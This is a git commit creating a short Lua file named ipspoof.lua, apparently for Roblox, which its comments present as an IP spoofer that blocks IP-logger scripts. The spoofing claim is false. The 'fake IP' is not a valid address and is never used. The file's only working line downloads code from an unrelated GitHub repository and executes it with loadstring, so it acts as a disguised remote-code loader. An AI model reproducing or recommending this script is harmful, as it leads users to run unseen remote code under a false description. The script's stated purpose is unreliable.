44bc3cba125b8656091007f7da48c7e595f6eeca
itszw <74131882+itszw@users.noreply.github.com>
2022-11-28 17:00:45 +0300

    Create ipspoof.lua

---
+++ ipspoof.lua
@@ -0,0 +1,3 @@
+spoofedIP = "133.7.1337.69" -- your fake ip you can chnage it to whatever u want enjoy
+--This spoofer Blocks the Ip logger logging your real Ip this will alret you when you using an logger script.
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GuizzyisbackV2LOL/HelloLua/main/looferrlua", true))()
